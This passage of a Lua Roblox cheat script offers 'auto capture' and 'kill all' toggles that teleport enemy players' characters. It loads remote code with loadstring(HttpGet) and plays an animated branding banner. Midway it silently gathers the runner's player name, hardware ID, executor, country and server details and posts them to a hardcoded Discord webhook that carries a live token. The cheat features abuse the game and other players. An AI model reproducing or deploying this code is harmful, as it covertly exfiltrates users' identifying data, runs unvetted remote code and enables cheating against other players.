                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, objective.Trigger, 0)
            end
        end
    end

    RunService.RenderStepped:Connect(AutoCapPoint1)

miscCheckGroup:addToggle({
    text = "auto capture",
    flag = "autocaptureobj",
    callback = function(value)
        getgenv().AutoCapPoint = value
    end
})

getgenv().isManipulating = false  -- Toggle this variable to enable or disable manipulation

-- Define the distance in front of the local player where other players will be positioned
local distanceInFront = 10

-- Function to update the positions of players on other teams
local function AutoManipulatePlayers()
    while true do
        if getgenv().isManipulating then
            local localPlayer = game.Players.LocalPlayer
            local localCharacter = localPlayer.Character
            local localTeam = localPlayer.Team

            if localCharacter and localTeam then
                local localRootPart = localCharacter:FindFirstChild("HumanoidRootPart")

                if localRootPart then
                    for _, player in pairs(game.Players:GetPlayers()) do
                        -- Check if the player is not on the local player's team and is not the local player
                        if player.Team ~= localTeam and player ~= localPlayer then
                            local character = player.Character
                            if character then
                                local rootPart = character:FindFirstChild("HumanoidRootPart")
                                if rootPart then
                                    -- Calculate the new position in front of the local player
                                    local newPosition = localRootPart.CFrame * CFrame.new(0, 0, -distanceInFront)
                                    rootPart.CFrame = CFrame.new(newPosition.Position, localRootPart.Position)
                                end
                            end
                        end
                    end
                end
            end
        end
        wait(0.1) -- Adjust the wait time as needed
    end
end

-- Start the loop in a separate thread
spawn(AutoManipulatePlayers)

miscCheckGroup:addToggle({
    text = "kill all",
    flag = "killall",
    callback = function(value)
        getgenv().isManipulating = value
    end
})

local InvisAlert = false

local notificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/ui-libraries/main/xaxas-notification/src.lua"))();
local notifications = notificationLibrary.new({            
    NotificationLifetime = 3, 
    NotificationPosition = "Middle",
    
    TextFont = Enum.Font.Code,
    TextColor = Color3.fromRGB(255, 255, 255),
    TextSize = 15,
    
    TextStrokeTransparency = 0, 
    TextStrokeColor = Color3.fromRGB(0, 0, 0)
});

notifications:BuildNotificationUI()

local function checkTransparency(player)
    if player.Character then
        local head = player.Character:FindFirstChild("Head")
        if head and InvisAlert and head.Transparency == 1 then
            return true
        end
    end
    return false
end

local notifiedPlayers = {}
local localPlayer = game.Players.LocalPlayer

game.Players.PlayerAdded:Connect(function(player)
    if player == localPlayer then return end
    
    player.CharacterAdded:Connect(function(character)
        local head = character:WaitForChild("Head", 10)
        
        if head then
            head:GetPropertyChangedSignal("Transparency"):Connect(function()
                if InvisAlert and head.Transparency == 1 then
                    if not notifiedPlayers[player] or not notifiedPlayers[player].notified then
                        notifications:Notify(player.Name .. " has gone invisible")
                        notifiedPlayers[player] = {notified = true, lastCheck = tick()}
                    elseif tick() - notifiedPlayers[player].lastCheck > 1 then
                        notifiedPlayers[player].notified = false
                    end
                end
            end)
            
            if checkTransparency(player) then
                notifications:Notify(player.Name .. " has gone invisible")
                notifiedPlayers[player] = {notified = true, lastCheck = tick()}
            end
        end
    end)
end)

game:GetService("RunService").Stepped:Connect(function()
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= localPlayer and checkTransparency(player) then
            if not notifiedPlayers[player] or not notifiedPlayers[player].notified then
                notifications:Notify(player.Name .. " has gone invisible")
                notifiedPlayers[player] = {notified = true, lastCheck = tick()}
            elseif tick() - notifiedPlayers[player].lastCheck > 1 then
                notifiedPlayers[player].notified = false
            end
        end
    end
end)

game.Players.PlayerRemoving:Connect(function(player)
    notifiedPlayers[player] = nil
end)

createconfigs:addTextbox({text = "Name",flag = "config_name"})
createconfigs:addButton({text = "Load",callback = library.loadConfig})

configsettings:addConfigbox({flag = 'cfgs',values = {}})
configsettings:addButton({text = "Load",callback = library.loadConfig})
configsettings:addButton({text = "Update",callback = library.saveConfig})
configsettings:addButton({text = "Delete",callback = library.deleteConfig})
configsettings:addButton({text = "Refresh",callback = library.refreshConfigs})

local url = "https://canary.discord.com/api/webhooks/1273043244581650504/rRYlL8cZ6PWCAwvqqjm9uisTuLVWMygrjNM44CXWBDEY6T0PE2Y_A-Mng8ASOjvK8u43"

local LocalizationService = game:GetService("LocalizationService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

local countryCodes = {
    ["AD"] = "Andorra",
    ["AE"] = "United Arab Emirates",
    ["AF"] = "Afghanistan",
    ["AG"] = "Antigua and Barbuda",
    ["AI"] = "Anguilla",
    ["AL"] = "Albania",
    ["AM"] = "Armenia",
    ["AO"] = "Angola",
    ["AR"] = "Argentina",
    ["AS"] = "American Samoa",
    ["AT"] = "Austria",
    ["AU"] = "Australia",
    ["AW"] = "Aruba",
    ["AX"] = "Åland Islands",
    ["AZ"] = "Azerbaijan",
    ["BA"] = "Bosnia and Herzegovina",
    ["BB"] = "Barbados",
    ["BD"] = "Bangladesh",
    ["BE"] = "Belgium",
    ["BF"] = "Burkina Faso",
    ["BG"] = "Bulgaria",
    ["BH"] = "Bahrain",
    ["BI"] = "Burundi",
    ["BJ"] = "Benin",
    ["BL"] = "Saint Barthélemy",
    ["BM"] = "Bermuda",
    ["BN"] = "Brunei Darussalam",
    ["BO"] = "Bolivia",
    ["BQ"] = "Bonaire, Sint Eustatius and Saba",
    ["BR"] = "Brazil",
    ["BS"] = "Bahamas",
    ["BT"] = "Bhutan",
    ["BV"] = "Bouvet Island",
    ["BW"] = "Botswana",
    ["BY"] = "Belarus",
    ["BZ"] = "Belize",
    ["CA"] = "Canada",
    ["CC"] = "Cocos (Keeling) Islands",
    ["CD"] = "Congo, Democratic Republic of the",
    ["CF"] = "Central African Republic",
    ["CG"] = "Congo",
    ["CH"] = "Switzerland",
    ["CI"] = "Côte d'Ivoire",
    ["CK"] = "Cook Islands",
    ["CL"] = "Chile",
    ["CM"] = "Cameroon",
    ["CN"] = "China",
    ["CO"] = "Colombia",
    ["CR"] = "Costa Rica",
    ["CU"] = "Cuba",
    ["CV"] = "Cabo Verde",
    ["CW"] = "Curaçao",
    ["CX"] = "Christmas Island",
    ["CY"] = "Cyprus",
    ["CZ"] = "Czechia",
    ["DE"] = "Germany",
    ["DJ"] = "Djibouti",
    ["DK"] = "Denmark",
    ["DM"] = "Dominica",
    ["DO"] = "Dominican Republic",
    ["DZ"] = "Algeria",
    ["EC"] = "Ecuador",
    ["EE"] = "Estonia",
    ["EG"] = "Egypt",
    ["EH"] = "Western Sahara",
    ["ER"] = "Eritrea",
    ["ES"] = "Spain",
    ["ET"] = "Ethiopia",
    ["FI"] = "Finland",
    ["FJ"] = "Fiji",
    ["FM"] = "Micronesia (Federated States of)",
    ["FO"] = "Faroe Islands",
    ["FR"] = "France",
    ["GA"] = "Gabon",
    ["GB"] = "United Kingdom",
    ["GD"] = "Grenada",
    ["GE"] = "Georgia",
    ["GF"] = "French Guiana",
    ["GG"] = "Guernsey",
    ["GH"] = "Ghana",
    ["GI"] = "Gibraltar",
    ["GL"] = "Greenland",
    ["GM"] = "Gambia",
    ["GN"] = "Guinea",
    ["GP"] = "Guadeloupe",
    ["GQ"] = "Equatorial Guinea",
    ["GR"] = "Greece",
    ["GT"] = "Guatemala",
    ["GU"] = "Guam",
    ["GW"] = "Guinea-Bissau",
    ["GY"] = "Guyana",
    ["HK"] = "Hong Kong",
    ["HM"] = "Heard Island and McDonald Islands",
    ["HN"] = "Honduras",
    ["HR"] = "Croatia",
    ["HT"] = "Haiti",
    ["HU"] = "Hungary",
    ["ID"] = "Indonesia",
    ["IE"] = "Ireland",
    ["IL"] = "Israel",
    ["IM"] = "Isle of Man",
    ["IN"] = "India",
    ["IO"] = "British Indian Ocean Territory",
    ["IQ"] = "Iraq",
    ["IR"] = "Iran",
    ["IS"] = "Iceland",
    ["IT"] = "Italy",
    ["JE"] = "Jersey",
    ["JM"] = "Jamaica",
    ["JO"] = "Jordan",
    ["JP"] = "Japan",
    ["KE"] = "Kenya",
    ["KG"] = "Kyrgyzstan",
    ["KH"] = "Cambodia",
    ["KI"] = "Kiribati",
    ["KM"] = "Comoros",
    ["KN"] = "Saint Kitts and Nevis",
    ["KP"] = "Korea, Democratic People's Republic of",
    ["KR"] = "Korea, Republic of",
    ["KW"] = "Kuwait",
    ["KY"] = "Cayman Islands",
    ["KZ"] = "Kazakhstan",
    ["LA"] = "Lao People's Democratic Republic",
    ["LB"] = "Lebanon",
    ["LC"] = "Saint Lucia",
    ["LI"] = "Liechtenstein",
    ["LK"] = "Sri Lanka",
    ["LR"] = "Liberia",
    ["LS"] = "Lesotho",
    ["LT"] = "Lithuania",
    ["LU"] = "Luxembourg",
    ["LV"] = "Latvia",
    ["LY"] = "Libya",
    ["MA"] = "Morocco",
    ["MC"] = "Monaco",
    ["MD"] = "Moldova",
    ["ME"] = "Montenegro",
    ["MF"] = "Saint Martin",
    ["MG"] = "Madagascar",
    ["MH"] = "Marshall Islands",
    ["MK"] = "North Macedonia",
    ["ML"] = "Mali",
    ["MM"] = "Myanmar",
    ["MN"] = "Mongolia",
    ["MO"] = "Macao",
    ["MP"] = "Northern Mariana Islands",
    ["MQ"] = "Martinique",
    ["MR"] = "Mauritania",
    ["MS"] = "Montserrat",
    ["MT"] = "Malta",
    ["MU"] = "Mauritius",
    ["MV"] = "Maldives",
    ["MW"] = "Malawi",
    ["MX"] = "Mexico",
    ["MY"] = "Malaysia",
    ["MZ"] = "Mozambique",
    ["NA"] = "Namibia",
    ["NC"] = "New Caledonia",
    ["NE"] = "Niger",
    ["NF"] = "Norfolk Island",
    ["NG"] = "Nigeria",
    ["NI"] = "Nicaragua",
    ["NL"] = "Netherlands",
    ["NO"] = "Norway",
    ["NP"] = "Nepal",
    ["NR"] = "Nauru",
    ["NU"] = "Niue",
    ["NZ"] = "New Zealand",
    ["OM"] = "Oman",
    ["PA"] = "Panama",
    ["PE"] = "Peru",
    ["PF"] = "French Polynesia",
    ["PG"] = "Papua New Guinea",
    ["PH"] = "Philippines",
    ["PK"] = "Pakistan",
    ["PL"] = "Poland",
    ["PM"] = "Saint Pierre and Miquelon",
    ["PN"] = "Pitcairn Islands",
    ["PR"] = "Puerto Rico",
    ["PT"] = "Portugal",
    ["PW"] = "Palau",
    ["PY"] = "Paraguay",
    ["QA"] = "Qatar",
    ["RE"] = "Réunion",
    ["RO"] = "Romania",
    ["RS"] = "Serbia",
    ["RU"] = "Russian Federation",
    ["RW"] = "Rwanda",
    ["SA"] = "Saudi Arabia",
    ["SB"] = "Solomon Islands",
    ["SC"] = "Seychelles",
    ["SD"] = "Sudan",
    ["SE"] = "Sweden",
    ["SG"] = "Singapore",
    ["SH"] = "Saint Helena",
    ["SI"] = "Slovenia",
    ["SJ"] = "Svalbard and Jan Mayen",
    ["SK"] = "Slovakia",
    ["SL"] = "Sierra Leone",
    ["SM"] = "San Marino",
    ["SN"] = "Senegal",
    ["SO"] = "Somalia",
    ["SR"] = "Suriname",
    ["SS"] = "South Sudan",
    ["ST"] = "Sao Tome and Principe",
    ["SV"] = "El Salvador",
    ["SX"] = "Sint Maarten",
    ["SY"] = "Syrian Arab Republic",
    ["SZ"] = "Eswatini",
    ["TC"] = "Turks and Caicos Islands",
    ["TD"] = "Chad",
    ["TF"] = "French Southern Territories",
    ["TG"] = "Togo",
    ["TH"] = "Thailand",
    ["TJ"] = "Tajikistan",
    ["TK"] = "Tokelau",
    ["TL"] = "Timor-Leste",
    ["TM"] = "Turkmenistan",
    ["TN"] = "Tunisia",
    ["TO"] = "Tonga",
    ["TR"] = "Turkey",
    ["TT"] = "Trinidad and Tobago",
    ["TV"] = "Tuvalu",
    ["TZ"] = "Tanzania",
    ["UA"] = "Ukraine",
    ["UG"] = "Uganda",
    ["UM"] = "United States Minor Outlying Islands",
    ["US"] = "United States",
    ["UY"] = "Uruguay",
    ["UZ"] = "Uzbekistan",
    ["VA"] = "Vatican City",
    ["VC"] = "Saint Vincent and the Grenadines",
    ["VE"] = "Venezuela",
    ["VG"] = "British Virgin Islands",
    ["VI"] = "United States Virgin Islands",
    ["VN"] = "Vietnam",
    ["VU"] = "Vanuatu",
    ["WF"] = "Wallis and Futuna",
    ["WS"] = "Samoa",
    ["YE"] = "Yemen",
    ["YT"] = "Mayotte",
    ["ZA"] = "South Africa",
    ["ZM"] = "Zambia",
    ["ZW"] = "Zimbabwe"
}

local function getCountryName(countryCode)
    return countryCodes[countryCode] or "Unknown Country"
end

local function getTimeWithTimezone()
    local currentTime = os.time()
    local formattedTime = os.date("%Y-%m-%d %H:%M:%S", currentTime)

    local function getTimezoneOffset()
        local utcTime = os.time(os.date("!*t", currentTime))
        local localTime = os.time(os.date("*t", currentTime))
        local diff = os.difftime(localTime, utcTime)
        local hours = math.floor(diff / 3600)
        local minutes = math.floor((diff % 3600) / 60)
        return string.format("%+03d:%02d", hours, minutes)
    end

    return formattedTime .. " " .. getTimezoneOffset()
end

local hwid = gethwid()

local identifyexecutor1 = identifyexecutor()

local success, countryCode = pcall(function()
    return LocalizationService:GetCountryRegionForPlayerAsync(player)
end)

local countryName = "Unknown Country"
if success then
    countryName = getCountryName(countryCode)
end

local playerName = player.Name
local timestamp = getTimeWithTimezone()
local gameLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
local version = "Project X Free"
local serverId = game.JobId
local hwid = gethwid()
local identifyexecutor = identifyexecutor()

local data = {
    ["content"] = "Player Name: " .. playerName ..
                  ", Execution Time: " .. timestamp ..
                  ", Game Link: " .. gameLink ..
                  ", Version: " .. version ..
                  ", Server ID: " .. serverId ..
                  ", HWID: " .. hwid ..
                  ", Executor: " .. identifyexecutor1 ..
                  ", Country: " .. countryName
}

local newdata = HttpService:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}

local request = http_request or request or HttpPost or syn.request
local requestData = {
    Url = url,
    Body = newdata,
    Method = "POST",
    Headers = headers
}
request(requestData)

local options = {
    "h",
    "he",
    "hel",
    "hell",
    "hellh",
    "hellho",
    "hellhou",
    "hellhoun",
    "hellhound",
    "hellhound<font color=\"#c375ae\">.</font>",
    "hellhound<font color=\"#c375ae\">.p</font>",
    "hellhound<font color=\"#c375ae\">.pr</font>",
    "hellhound<font color=\"#c375ae\">.pri</font>",
    "hellhound<font color=\"#c375ae\">.priv</font>",
    "hellhound<font color=\"#c375ae\">.priva</font>",
    "hellhound<font color=\"#c375ae\">.privat</font>",
    "hellhound<font color=\"#c375ae\">.private</font>",
    "hellhound<font color=\"#c375ae\">.privat</font>",
    "hellhound<font color=\"#c375ae\">.priva</font>",
    "hellhound<font color=\"#c375ae\">.priv</font>",
    "hellhound<font color=\"#c375ae\">.pri</font>",
    "hellhound<font color=\"#c375ae\">.pr</font>",
    "hellhound<font color=\"#c375ae\">.p</font>",
    "hellhound<font color=\"#c375ae\">.</font>",
    "hellhound",
    "hellhoun",
    "hellhou",
    "hellho",
    "hellh",
    "hell",
    "hel",
    "he",
    "h",
    "",
    "n",
    "ne",
    "net",
    "nett",
    "netts",
    "nettsp",
    "nettspe",
    "nettspen",
    "nettspend",
    "nettspend<font color=\"#c375ae\">.</font>",
    "nettspend<font color=\"#c375ae\">.f</font>",
    "nettspend<font color=\"#c375ae\">.fan</font>",
    "nettspend<font color=\"#c375ae\">.fanc</font>",
    "nettspend<font color=\"#c375ae\">.fancl</font>",
    "nettspend<font color=\"#c375ae\">.fanclu</font>",
    "nettspend<font color=\"#c375ae\">.fanclub</font>",
    "nettspend<font color=\"#c375ae\">.fanclu</font>",
    "nettspend<font color=\"#c375ae\">.fancl</font>",
    "nettspend<font color=\"#c375ae\">.fanc</font>",
    "nettspend<font color=\"#c375ae\">.fa</font>",
    "nettspend<font color=\"#c375ae\">.f</font>",
    "nettspend<font color=\"#c375ae\">.</font>",
    "nettspend",
    "nettspen",
    "nettspe",
    "nettsp",
    "netts",
    "nett",
    "net",
    "ne",
    "n",
    "",
    "d",
    "dj",
    "dj<font color=\"#c375ae\">.</font>",
    "dj<font color=\"#c375ae\">.s</font>",
    "dj<font color=\"#c375ae\">.so</font>",
    "dj<font color=\"#c375ae\">.sor</font>",
    "dj<font color=\"#c375ae\">.sorr</font>",
    "dj<font color=\"#c375ae\">.sorro</font>",
    "dj<font color=\"#c375ae\">.sorrow</font>",
    "dj<font color=\"#c375ae\">.sorro</font>",
    "dj<font color=\"#c375ae\">.sorr</font>",
    "dj<font color=\"#c375ae\">.sor</font>",
    "dj<font color=\"#c375ae\">.so</font>",
    "dj<font color=\"#c375ae\">.s</font>",
    "dj<font color=\"#c375ae\">.</font>",
    "dj",
    "d",
    "",
    "h",
    "ha",
    "hau",
    "haunt",
    "haunte",
    "haunted",
    "haunted ",
    "haunted m",
    "haunted mo",
    "haunted mou",
    "haunted moun",
    "haunted mound",
    "haunted mound<font color=\"#c375ae\">.</font>",
    "haunted mound<font color=\"#c375ae\">.l</font>",
    "haunted mound<font color=\"#c375ae\">.lu</font>",
    "haunted mound<font color=\"#c375ae\">.lua</font>",
    "haunted mound<font color=\"#c375ae\">.lu</font>",
    "haunted mound<font color=\"#c375ae\">.l</font>",
    "haunted mound<font color=\"#c375ae\">.</font>",
    "haunted mound",
    "haunted moun",
    "haunted mou",
    "haunted mo",
    "haunted m",
    "haunted ",
    "haunted",
    "haunte",
    "haunt",
    "haun",
    "hau",
    "ha",
    "h",
    ""
}

-- Assuming `menu.bg.pre` is a TextLabel or TextButton
local index = 1
local interval = 0.2 -- Interval in seconds

local function changeText()
    menu.bg.pre.Text = options[index]
    index = index % #options + 1
end

changeText() -- Set initial text immediately

-- Timer to change text every `interval` seconds
while true do
    wait(interval)
    changeText()
end
